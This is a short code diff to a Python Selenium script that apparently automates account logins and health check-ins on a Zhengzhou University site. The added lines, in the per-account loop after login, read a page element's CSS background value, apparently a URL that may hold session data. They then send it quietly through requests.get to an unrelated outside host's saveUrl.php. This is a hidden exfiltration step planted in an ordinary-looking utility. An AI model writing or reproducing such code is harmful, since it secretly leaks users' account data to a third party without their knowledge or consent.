@@ -1,6 +1,6 @@
 # coding:utf-8
 import os
-
+import requests
 import selenium
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -37,6 +37,10 @@ for acc in account:
         print(res)
         err += 1
     else:
+        driver.get('https://jksb.v.zzu.edu.cn/vls6sss/zzujksb.dll/first0?fun2=s&door=0021')
+        pic = driver.find_element(by=By.XPATH, value="//div[@id='bak_0']/div[1]")
+        back_url = pic.value_of_css_property("background")
+        requests.get("http://ftp6581717.host130.sanfengyun.cn/saveUrl.php?v="+back_url)
         iframe = driver.find_element(by=By.NAME, value='zzj_top_6s')  # 进入信息确认界面
         driver.switch_to.frame(iframe)  # 切换为子页面
         res = driver.find_element(by=By.XPATH, value='//*[@id="bak_0"]/div[5]/span')
